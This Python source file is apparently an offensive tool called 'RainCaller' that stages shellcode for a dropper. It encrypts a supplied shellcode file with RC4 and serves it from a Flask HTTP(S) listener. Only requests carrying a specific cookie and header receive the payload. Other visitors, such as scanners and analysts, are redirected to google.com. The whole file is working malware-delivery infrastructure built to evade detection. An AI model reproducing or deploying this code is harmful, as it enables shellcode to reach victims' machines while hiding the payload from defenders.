import os, threading, argparse, logging, signal

from flask import Flask, send_file, redirect, request
from time import sleep
from Crypto.Cipher import ARC4

ENC_FILE_NAME = 'dropper_sc_enc.bin' #Name of the file containing RC4 encrypted shellcode
INVALID_REDIR = 'https://google.com' #URL of a website where invalid requests are redirected to
ANSI_RED      = '\033[91m'
ANSI_ORNG     = '\033[93m'
ANSI_CYAN     = '\033[96m'
ANSI_GRN      = '\033[92m'
ANSI_CLR      = '\033[0m'

def __PrintStub(color, symbol, string, ret, fatal=False, end='\n'):
    print(f'{color}[{symbol}]> {string}{ANSI_CLR}', end=end)
    if fatal:
        os._exit(-1)
    else:
        return ret

def Perror(s, end='\n'):
    return __PrintStub(ANSI_RED, '-', s, False, fatal=True, end=end)

def Pwarn(s, end='\n'):
    return __PrintStub(ANSI_ORNG, '!', s, False, end=end)

def Pinfo(s, end='\n'):
    return __PrintStub(ANSI_CYAN, '*', s, True, end=end)

def Psuccess(s, end='\n'):
    return __PrintStub(ANSI_GRN,  '+', s, True, end=end)

def Banner():
    print('''
██████╗  █████╗ ██╗███╗   ██╗ ██████╗ █████╗ ██╗     ██╗     ███████╗██████╗ 
██╔══██╗██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║     ██║     ██╔════╝██╔══██╗
██████╔╝███████║██║██╔██╗ ██║██║     ███████║██║     ██║     █████╗  ██████╔╝
██╔══██╗██╔══██║██║██║╚██╗██║██║     ██╔══██║██║     ██║     ██╔══╝  ██╔══██╗
██║  ██║██║  ██║██║██║ ╚████║╚██████╗██║  ██║███████╗███████╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                                @v1.1                                                                                                                         
    ''')

def SigHandler(sig, frame):
    Pinfo('Goodbye!')
    os._exit(0)

def __Listen(args, app):
    try:
        ctx = None
        if args.ssl_crt and args.ssl_key:
            ctx = (args.ssl_crt, args.ssl_key)
        app.run(args.address, args.port, threaded=True, use_reloader=False, ssl_context=ctx)
    except Exception as e:
        Perror(f'Failed to start the HTTP listener: {str(e)}')

def TListen(args, app):
    tid = None
    
    Pinfo('Starting the server thread...')
    try:
        tid        = threading.Thread(target=__Listen, args=(args, app,))
        tid.daemon = True

        tid.start()
    except Exception as e:
        Perror(f'Failed to start the listener thread: {str(e)}.')
    sleep(0.3)
    Psuccess('Done.\n')

    return tid

def InitFlask(args):
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

    app = Flask(__name__)
    
    @app.route(args.uri)
    def SC():
        r =  redirect(INVALID_REDIR, code=302)
        
        if request.cookies.get('CONSENT') and request.cookies.get('CONSENT') == 'YES' and request.headers.get('Accept-Encoding') and request.headers.get('Accept-Encoding') == 'gzip, deflate':
            Psuccess(f'Good hit on {args.uri} from {request.remote_addr}!')
            r = send_file(ENC_FILE_NAME, mimetype='application/octet-stream')
        else:
            Pwarn(f'Suspicious hit on {args.uri} from {request.remote_addr}!')
        return r
    
    return app

def CryptShellcode(file, key):
    shellcode = None
    cipher    = ARC4.new(key.encode('utf-8'))

    with open(file, mode='rb') as fr:
        shellcode = fr.read()
    
    try:
        with open(ENC_FILE_NAME, mode='wb') as fw:
            fw.write(cipher.encrypt(shellcode))
    except Exception as e:
        Perror(f'Failed to write encrypted shellcode to a file. Is the directory writable?')

def ParseArgs():
    parser = argparse.ArgumentParser()
    parser.add_argument('-a', '--address', type=str, required=True,  help="Listener address")
    parser.add_argument('-p', '--port',    type=int, required=True,  help="Listener port")
    parser.add_argument('-u', '--uri',     type=str, required=True,  help="URI where shellcode will be retrieved from")
    parser.add_argument('-f', '--file',    type=str, required=True,  help="Shellcode file to drop")
    parser.add_argument('-k', '--key',     type=str, required=True,  help="Shellcode encryption key")
    parser.add_argument('--ssl_key',       type=str, required=False, help="Path to an SSL certificate")
    parser.add_argument('--ssl_crt',       type=str, required=False, help="Path to an SSL key")
    
    args = parser.parse_args()
    r = True
    if args.port <= 0 or args.port > 65535:
        r = Pwarn("Port argument needs to be an integer between 1 and 65535.")
    if (args.port > 0 and args.port <= 1024) and os.geteuid() != 0:
        r = Pwarn("Ports between 1 and 1024 require root permissions.")
    if '/' not in args.uri:
        r = Pwarn("Valid URI needs to have a / (e.g. /download)")
    if not os.path.isfile(args.file) or not os.access(args.file, os.R_OK):
        r = Pwarn("Shellcode file is inaccessible (check permissions).")
    if len(args.key) < 5:
        r = Pwarn("RC4 key needs to be at least 5 characters long.")
    if (args.ssl_key and not args.ssl_crt) or (args.ssl_crt and not args.ssl_key):
        r = Pwarn("For SSL both key and crt options need to be selected.")
    if args.ssl_key and (not os.path.isfile(args.ssl_key) or not os.access(args.ssl_key, os.R_OK)):
        r = Pwarn("SSL Key file is inaccessible (check permissions).")
    if args.ssl_crt and (not os.path.isfile(args.ssl_crt) or not os.access(args.ssl_crt, os.R_OK)):
        r = Pwarn("SSL Crt file is inaccessible (check permissions).")

    if not r:
        os._exit(-1)

    return args

if __name__ == '__main__':
    signal.signal(signal.SIGINT, SigHandler)

    Banner()
    userArgs = ParseArgs()

    CryptShellcode(userArgs.file, userArgs.key)

    app = InitFlask(userArgs)
    tid = TListen(userArgs, app)    
    tid.join()